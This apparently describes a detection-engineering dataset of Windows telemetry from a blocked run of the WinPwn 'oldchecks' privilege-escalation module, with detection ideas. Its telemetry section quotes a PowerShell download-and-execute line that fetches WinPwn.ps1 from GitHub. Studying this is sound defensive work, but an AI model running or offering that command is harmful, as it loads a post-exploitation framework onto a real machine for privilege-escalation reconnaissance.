# T1082-16: System Information Discovery — WinPwn - Powersploits privesc checks

## Technique Context

T1082 System Information Discovery involves adversaries gathering information about the operating system, hardware, and software configuration of compromised systems. This intelligence helps attackers understand their environment, identify privilege escalation opportunities, and plan lateral movement. The WinPwn framework's "oldchecks" module specifically executes PowerSploit-based privilege escalation checks, combining system discovery with vulnerability assessment.

Detection engineers focus on identifying automated discovery patterns, especially when multiple system queries occur in rapid succession. WinPwn represents a popular post-exploitation framework that bundles common PowerShell-based reconnaissance and privilege escalation modules, making it a high-value detection target for Windows environments.

## What This Dataset Contains

This dataset captures a Windows Defender-blocked attempt to execute WinPwn's privilege escalation discovery module. The key telemetry includes:

**Process Creation Chain (Security 4688):**
- Initial PowerShell execution with command line: `"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'...oldchecks -noninteractive -consoleoutput}`
- `whoami.exe` execution: `"C:\Windows\system32\whoami.exe"` — a classic system discovery command

**PowerShell Activity (EID 4104, 4103, 4100):**
- Script block logging shows the WinPwn download attempt: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
- Module invocation logging captures `New-Object net.webclient` creation
- Critical PowerShell error (EID 4100): `"This script contains malicious content and has been blocked by your antivirus software"` — Windows Defender's AMSI detection

**Network Activity (Sysmon EID 22):**
- DNS query for `raw.githubusercontent.com` indicating attempted script download

**Sysmon Behavioral Telemetry:**
- Multiple PowerShell.exe process creations (EID 1) with RuleName tags for T1059.001 (PowerShell) and T1033 (System Owner/User Discovery)
- Process access events (EID 10) showing PowerShell accessing whoami.exe with high privileges (GrantedAccess: 0x1FFFFF)

## What This Dataset Does Not Contain

The dataset lacks the actual system information that WinPwn's oldchecks module would have gathered because Windows Defender blocked the malicious script execution before completion. Missing elements include:

- No WMI queries for system configuration details (typically captured in WMI-Activity/Operational logs)
- No registry enumeration for privilege escalation vectors
- No file system reconnaissance beyond basic PowerShell startup profiling
- Limited network activity — only the DNS query, but no actual HTTP download due to AMSI blocking
- No output from privilege escalation checks that would normally identify vulnerable services, unquoted service paths, or weak permissions

The Sysmon ProcessCreate events don't capture all child processes due to the sysmon-modular include-mode filtering, though Security 4688 provides complete process auditing coverage.

## Assessment

This dataset provides excellent detection value for identifying WinPwn framework usage attempts, particularly demonstrating how modern endpoint protection (Windows Defender + AMSI) creates rich "attempt telemetry" even when blocking malicious execution. The combination of command-line logging, PowerShell script block logging, and process behavioral monitoring creates multiple detection layers.

The telemetry quality is high for building detections around post-exploitation framework downloads and execution attempts. However, for understanding the full scope of system discovery activities that successful WinPwn execution would generate, additional datasets with successful execution would complement this blocked-attempt scenario.

## Detection Opportunities Present in This Data

1. **WinPwn Framework Identification** — PowerShell command lines containing `S3cur3Th1sSh1t` repository references and `oldchecks` module names
2. **Malicious Script Download Patterns** — `iex(new-object net.webclient).downloadstring()` pattern targeting raw.githubusercontent.com
3. **AMSI Malware Detection Events** — PowerShell EID 4100 events with "malicious content" blocking messages
4. **Suspicious PowerShell Process Chains** — Parent-child relationships between PowerShell processes executing system discovery commands
5. **High-Privilege Process Access** — Sysmon EID 10 events showing PowerShell accessing system utilities with 0x1FFFFF access rights
6. **Discovery Command Execution** — Security 4688 events for whoami.exe execution from PowerShell contexts
7. **GitHub Raw Content DNS Queries** — Network queries to raw.githubusercontent.com from PowerShell processes, especially combined with script execution attempts
